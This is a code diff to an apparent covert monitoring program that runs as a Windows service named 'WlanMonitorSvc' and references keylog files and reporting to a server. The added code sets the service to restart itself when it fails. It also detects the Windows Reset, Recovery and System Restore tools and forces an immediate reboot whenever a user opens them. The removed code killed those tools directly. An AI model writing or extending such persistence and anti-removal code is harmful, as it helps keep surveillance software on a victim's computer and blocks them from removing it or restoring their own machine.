@@ -24,6 +24,7 @@
 #include <atomic>
 #include <algorithm>
 #include <cctype>
+#include <cwctype>
 #include <cstring>
 #include <cstdlib>
 #include <ctime>
@@ -50,7 +51,7 @@
 
 // ==============================================================
 // 【每次编译必看配置】请在每次点击【生成】前，在此处手动输入最新版本号！
-#define MANUAL_COMPILE_VERSION "1.9.9"
+#define MANUAL_COMPILE_VERSION "1.9.11"
 #define MANUAL_BUILD_CHANNEL "stable"
 // ==============================================================
 
@@ -101,6 +102,8 @@ const char* LEGACY_KEYLOG_TXT = "C:\\Users\\Public\\WlanMonitorSvc_Keylog.txt";
 const char* LEGACY_MEDIA_BOUNCE_CFG_TXT = "C:\\Users\\Public\\WlanMonitorSvc_MediaBounceCfg.txt";
 const char* LEGACY_WIFI_SHUTDOWN_EXEMPT_TXT = "C:\\Users\\Public\\WlanMonitorSvc_WifiShutdownExemptCfg.txt";
 std::atomic<ULONGLONG> g_LastSuccessfulHeartbeatTick{0};
+
+std::string WideToUtf8(const std::wstring& wideStr);
 
 bool IsUpdateExitRequested() {
     HANDLE hEvent = OpenEventA(SYNCHRONIZE, FALSE, UPDATE_EXIT_EVENT_NAME);
@@ -428,6 +431,143 @@ std::string GetProcessListNative() {
     }
     res += "]";
     return res;
+}
+
+std::wstring ToLowerWide(std::wstring value) {
+    std::transform(value.begin(), value.end(), value.begin(), [](wchar_t ch) {
+        return (wchar_t)towlower(ch);
+    });
+    return value;
+}
+
+bool WideContainsAny(const std::wstring& haystack, const std::vector<std::wstring>& needles) {
+    std::wstring low = ToLowerWide(haystack);
+    for (const auto& needle : needles) {
+        if (!needle.empty() && low.find(needle) != std::wstring::npos) return true;
+    }
+    return false;
+}
+
+std::wstring GetProcessImageNameWide(DWORD pid) {
+    std::wstring procName;
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+    if (hProcess) {
+        wchar_t path[MAX_PATH] = {0};
+        DWORD len = MAX_PATH;
+        if (QueryFullProcessImageNameW(hProcess, 0, path, &len)) {
+            std::wstring fullPath = path;
+            size_t pos = fullPath.find_last_of(L"\\/");
+            procName = (pos != std::wstring::npos) ? fullPath.substr(pos + 1) : fullPath;
+        }
+        CloseHandle(hProcess);
+    }
+    return ToLowerWide(procName);
+}
+
+struct ResetWindowScanCtx {
+    bool detected;
+    std::wstring reason;
+};
+
+BOOL CALLBACK EnumResetChildWindowsProc(HWND hwnd, LPARAM lParam) {
+    ResetWindowScanCtx* ctx = (ResetWindowScanCtx*)lParam;
+    if (!ctx || ctx->detected) return FALSE;
+
+    wchar_t text[512] = {0};
+    GetWindowTextW(hwnd, text, 511);
+    std::wstring value = text;
+
+    wchar_t cls[256] = {0};
+    GetClassNameW(hwnd, cls, 255);
+    if (value.empty() && cls[0]) value = cls;
+
+    static const std::vector<std::wstring> exactResetKeywords = {
+        L"reset this pc", L"reset your pc", L"reset pc",
+        L"重置此电脑", L"重设此电脑", L"初始化这台电脑",
+        L"reset this device", L"factory reset"
+    };
+    static const std::vector<std::wstring> recoveryPageKeywords = {
+        L"recovery", L"恢复", L"reset", L"重置", L"初始化"
+    };
+
+    if (WideContainsAny(value, exactResetKeywords) || WideContainsAny(value, recoveryPageKeywords)) {
+        ctx->detected = true;
+        ctx->reason = value;
+        return FALSE;
+    }
+    return TRUE;
+}
+
+BOOL CALLBACK EnumResetWindowsProc(HWND hwnd, LPARAM lParam) {
+    ResetWindowScanCtx* ctx = (ResetWindowScanCtx*)lParam;
+    if (!ctx || ctx->detected) return FALSE;
+    if (!IsWindowVisible(hwnd)) return TRUE;
+
+    DWORD pid = 0;
+    GetWindowThreadProcessId(hwnd, &pid);
+    std::wstring procName = GetProcessImageNameWide(pid);
+
+    wchar_t title[512] = {0};
+    GetWindowTextW(hwnd, title, 511);
+    std::wstring titleText = title;
+
+    static const std::vector<std::wstring> exactResetKeywords = {
+        L"reset this pc", L"reset your pc", L"reset pc",
+        L"重置此电脑", L"重设此电脑", L"初始化这台电脑",
+        L"factory reset"
+    };
+    if (WideContainsAny(titleText, exactResetKeywords)) {
+        ctx->detected = true;
+        ctx->reason = titleText;
+        return FALSE;
+    }
+
+    bool isSettingsOrRecoveryHost =
+        procName == L"systemsettings.exe" ||
+        procName == L"systemsettingsadminflows.exe" ||
+        procName == L"systemreset.exe" ||
+        procName == L"systemresetplatform.exe" ||
+        procName == L"rstrui.exe";
+    if (!isSettingsOrRecoveryHost) return TRUE;
+
+    ResetWindowScanCtx childCtx = {};
+    EnumChildWindows(hwnd, EnumResetChildWindowsProc, (LPARAM)&childCtx);
+    if (childCtx.detected) {
+        ctx->detected = true;
+        ctx->reason = procName + L" " + childCtx.reason;
+        return FALSE;
+    }
+    return TRUE;
+}
+
+bool IsWindowsResetOrRecoveryOpen(std::string& reason) {
+    ResetWindowScanCtx ctx = {};
+    EnumWindows(EnumResetWindowsProc, (LPARAM)&ctx);
+    if (ctx.detected) {
+        reason = WideToUtf8(ctx.reason);
+        return true;
+    }
+
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32W pe;
+        pe.dwSize = sizeof(PROCESSENTRY32W);
+        if (Process32FirstW(hSnap, &pe)) {
+            do {
+                std::wstring exe = ToLowerWide(pe.szExeFile);
+                if (exe == L"systemreset.exe" ||
+                    exe == L"systemresetplatform.exe" ||
+                    exe == L"rstrui.exe" ||
+                    exe == L"recoverydrive.exe") {
+                    reason = WideToUtf8(pe.szExeFile);
+                    CloseHandle(hSnap);
+                    return true;
+                }
+            } while (Process32NextW(hSnap, &pe));
+        }
+        CloseHandle(hSnap);
+    }
+    return false;
 }
 
 std::string ProtectToString(DWORD protect) {
@@ -1453,6 +1593,72 @@ typedef struct _SERVICE_FAILURE_ACTIONS_FLAG {
 } SERVICE_FAILURE_ACTIONS_FLAG, *LPSERVICE_FAILURE_ACTIONS_FLAG;
 #endif
 
+void ConfigureServiceRecovery(SC_HANDLE hService) {
+    SC_ACTION actions[3] = {};
+    actions[0].Type = SC_ACTION_RESTART;
+    actions[0].Delay = 30000;
+    actions[1].Type = SC_ACTION_RESTART;
+    actions[1].Delay = 60000;
+    actions[2].Type = SC_ACTION_RESTART;
+    actions[2].Delay = 120000;
+
+    SERVICE_FAILURE_ACTIONSA failureActions = {};
+    failureActions.dwResetPeriod = 86400;
+    failureActions.cActions = 3;
+    failureActions.lpsaActions = actions;
+    if (!ChangeServiceConfig2A(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &failureActions)) {
+        WriteLog(std::string("ChangeServiceConfig2A failure actions failed, error=") + std::to_string(GetLastError()));
+    }
+
+    SERVICE_FAILURE_ACTIONS_FLAG failureFlag = {};
+    failureFlag.fFailureActionsOnNonCrashFailures = TRUE;
+    if (!ChangeServiceConfig2A(hService, SERVICE_CONFIG_FAILURE_ACTIONS_FLAG, &failureFlag)) {
+        WriteLog(std::string("ChangeServiceConfig2A failure actions flag failed, error=") + std::to_string(GetLastError()));
+    }
+}
+
+void ConfigureInstalledServiceRecovery() {
+    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
+    if (!hSCM) {
+        WriteLog(std::string("OpenSCManagerA for recovery refresh failed, error=") + std::to_string(GetLastError()));
+        return;
+    }
+
+    SC_HANDLE hService = OpenServiceA(hSCM, "WlanMonitorSvc", SERVICE_CHANGE_CONFIG | SERVICE_QUERY_STATUS);
+    if (!hService) {
+        WriteLog(std::string("OpenServiceA for recovery refresh failed, error=") + std::to_string(GetLastError()));
+        CloseServiceHandle(hSCM);
+        return;
+    }
+
+    ConfigureServiceRecovery(hService);
+    CloseServiceHandle(hService);
+    CloseServiceHandle(hSCM);
+}
+
+bool StartServiceWithRetry(SC_HANDLE hService) {
+    const DWORD retryDelays[] = {0, 3000, 10000, 30000};
+    for (DWORD i = 0; i < (DWORD)(sizeof(retryDelays) / sizeof(retryDelays[0])); ++i) {
+        if (retryDelays[i] > 0) Sleep(retryDelays[i]);
+        if (StartServiceA(hService, 0, NULL)) {
+            WriteLog(i == 0 ? "服务已启动。" : ("服务启动重试成功，attempt=" + std::to_string(i + 1)));
+            return true;
+        }
+
+        DWORD err = GetLastError();
+        if (err == ERROR_SERVICE_ALREADY_RUNNING) {
+            WriteLog("服务已在运行。");
+            return true;
+        }
+        if (err == ERROR_SERVICE_DISABLED) {
+            WriteLog("StartServiceA 失败：服务被禁用，无法自动重试。");
+            return false;
+        }
+        WriteLog(std::string("StartServiceA 失败, attempt=") + std::to_string(i + 1) + ", error=" + std::to_string(err));
+    }
+    return false;
+}
+
 // 注册为 Windows 服务以实现开机自启（替换原来的 WMI 自启方案）
 void InstallWindowsService() {
     std::string exePath = GetExePath();
@@ -1489,6 +1695,7 @@ void InstallWindowsService() {
                 if (!ChangeServiceConfigA(hService, SERVICE_NO_CHANGE, SERVICE_AUTO_START, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL)) {
                     WriteLog(std::string("ChangeServiceConfigA failed, error=") + std::to_string(GetLastError()));
                 }
+                ConfigureServiceRecovery(hService);
             } else {
                 WriteLog(std::string("OpenServiceA failed, error=") + std::to_string(GetLastError()));
                 CloseServiceHandle(hSCM);
@@ -1501,20 +1708,12 @@ void InstallWindowsService() {
         }
     } else {
         WriteLog("服务创建成功。");
+        ConfigureServiceRecovery(hService);
     }
 
     // 尝试启动服务
     if (hService) {
-        if (!StartServiceA(hService, 0, NULL)) {
-            DWORD err = GetLastError();
-            if (err == ERROR_SERVICE_ALREADY_RUNNING) {
-                WriteLog("服务已在运行。");
-            } else {
-                WriteLog(std::string("StartServiceA 失败, error=") + std::to_string(err));
-            }
-        } else {
-            WriteLog("服务已启动。");
-        }
+        StartServiceWithRetry(hService);
         CloseServiceHandle(hService);
     }
 
@@ -1557,6 +1756,44 @@ std::string WideToUtf8(const std::wstring& wideStr) {
     WideCharToMultiByte(CP_UTF8, 0, wideStr.c_str(), -1, &utf8Str[0], utf8Len, NULL, NULL);
     while (!utf8Str.empty() && utf8Str.back() == '\0') utf8Str.pop_back();
     return utf8Str;
+}
+
+bool IsValidUtf8(const std::string& text) {
+    int remaining = 0;
+    for (unsigned char c : text) {
+        if (remaining == 0) {
+            if ((c & 0x80) == 0) {
+                continue;
+            } else if ((c & 0xE0) == 0xC0) {
+                if (c < 0xC2) return false;
+                remaining = 1;
+            } else if ((c & 0xF0) == 0xE0) {
+                remaining = 2;
+            } else if ((c & 0xF8) == 0xF0) {
+                if (c > 0xF4) return false;
+                remaining = 3;
+            } else {
+                return false;
+            }
+        } else {
+            if ((c & 0xC0) != 0x80) return false;
+            --remaining;
+        }
+    }
+    return remaining == 0;
+}
+
+std::string StateTextToUtf8(const std::string& text) {
+    if (text.empty()) return "";
+    bool hasNonAscii = false;
+    for (unsigned char c : text) {
+        if ((c & 0x80) != 0) {
+            hasNonAscii = true;
+            break;
+        }
+    }
+    if (!hasNonAscii || IsValidUtf8(text)) return text;
+    return AnsiToUtf8(text);
 }
 
 // 调用底层API进行强制关机
@@ -2318,7 +2555,7 @@ void ReportToServer() {
         if (ReadEncryptedLocalFile(ACTIVE_WND_STATE, LEGACY_ACTIVE_WND_TXT, content)) {
             TrimString(content);
             if (!content.empty()) {
-                lastFgStr = AnsiToUtf8(content);
+                lastFgStr = StateTextToUtf8(content);
             } else {
                 lastFgStr = "";
             }
@@ -2838,36 +3075,9 @@ void MonitorWiFiLoop() {
             dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
         }
 
-        // 【增强防刷机/防重置监测】
-        // 仅靠窗口标题(FindWindow)不可靠(受中英文语言和Win10/11 UWP应用框架限制)
-        // 改为直接检测 Windows 负责“初始化/恢复”的底层核心进程
-        bool isResetDetected = false;
-        HWND hResetWnd1 = FindWindowA(NULL, "初始化这台电脑");
-        HWND hResetWnd2 = FindWindowA(NULL, "Reset this PC");
-        if (hResetWnd1 != NULL || hResetWnd2 != NULL) isResetDetected = true;
-
-        HANDLE hSnapR = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-        if (hSnapR != INVALID_HANDLE_VALUE) {
-            PROCESSENTRY32W pe;
-            pe.dwSize = sizeof(PROCESSENTRY32W);
-            if (Process32FirstW(hSnapR, &pe)) {
-                do {
-                    // systemreset.exe = Win10/11 初始化这台电脑/重置此电脑 的核心后台进程
-                    // rstrui.exe = 系统还原点界面的进程
-                    if (_wcsicmp(pe.szExeFile, L"systemreset.exe") == 0 ||
-                        _wcsicmp(pe.szExeFile, L"rstrui.exe") == 0) {
-                        isResetDetected = true;
-                        // 发现的第一时间立即在内存中将其直接扼杀，防止用户手快点到下一步
-                        HANDLE hP = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
-                        if (hP) { TerminateProcess(hP, 0); CloseHandle(hP); }
-                    }
-                } while (Process32NextW(hSnapR, &pe));
-            }
-            CloseHandle(hSnapR);
-        }
-
-        if (isResetDetected) {
-            WriteLog("【严重警告】：防逃避触发！检测到系统正在尝试打开“初始化/重置/还原”功能，为防止误操作，立即强制重启电脑!");
+        std::string resetReason;
+        if (IsWindowsResetOrRecoveryOpen(resetReason)) {
+            WriteLog("【严重警告】：检测到 Windows 重置/恢复界面或进程，立即强制重启电脑。命中: " + resetReason);
             WinExec("shutdown.exe -r -f -t 0", SW_HIDE);
             Sleep(30000); // 缓冲等待系统重启
         }
@@ -3072,6 +3282,7 @@ void WINAPI ServiceMain(DWORD argc, LPSTR *argv) {
     SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
 
     WriteLog("【系统服务】Windows 服务 WlanMonitorSvc (服务模式) 开始运行!");
+    ConfigureInstalledServiceRecovery();
 
     // 开始进入后台功能检测循环
     MonitorWiFiLoop();
@@ -3812,7 +4023,7 @@ int main()
                                        low.find("firefox") != std::string::npos);
                     if (maybeMedia && !wnd.empty() && wnd.find("[") != std::string::npos && wnd.find("]") != std::string::npos) {
                         isPlaying = true;
-                        song = AnsiToUtf8(wnd);
+                        song = StateTextToUtf8(wnd);
                         WriteLog("MEDIA_INFO window fallback used: [" + wnd + "]");
                     }
                 }
